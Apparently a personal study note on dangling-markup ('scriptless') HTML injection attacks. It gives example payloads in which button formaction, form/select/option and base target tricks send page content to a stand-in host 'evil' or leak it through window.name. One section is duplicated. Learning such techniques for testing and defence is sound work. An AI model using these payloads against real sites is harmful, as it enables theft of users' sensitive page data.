# TOPIC
HTTP SCRIPTLESS ATTACKS / DANGLING MARKUP ATTACK

# OVERVIEW
This is a scenario or a situation, when you have found a HTML injection but could not escalate it, into a XSS or RCE, but you want to extract sensitive information.
This attack is also useful when sensitive informations are hardcoded in clear text in a HTML.

# INTERSTING ATTACK VECTORS (PART-1)

## BUTTON ATTACK
- The button tag in HTMl, can be used as a scriptless vector
- In HTML 5, the button tag is used for a default form submit, and there is an attribute called "formaction", which can be used to modify the action of the form in which the button is placed in.
- THe button can be placed and be used as a submit value, before a existing or a non existing submit button.
Example vector : <button name=xss type=submit formaction=//evil>I get consumed

## Option as a Scriptless Vector

- Option also consumes HTML and can be used as an attack vector
- Example: <form action=//evil><select name=xss><option><b>steal me!</b>

## Option as a Scriptless Vector

- Option also consumes HTML and can be used as an attack vector
- Example: <form action=//evil><select name=xss><option><b>steal me!</b>

## Using window.name via base target
You can also use the target attribute to assign the contents of the HTML after to the window name and then later retrieve it x-domain after a user clicks an external link.


<base target='
steal me'<b>test</b>

So here we inject a base tag with a target attribute, the target then assigns everything after ‘ to the window.name and then can be retrieved when the user clicks to the external server.

# REFERENCES
```
http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/
```
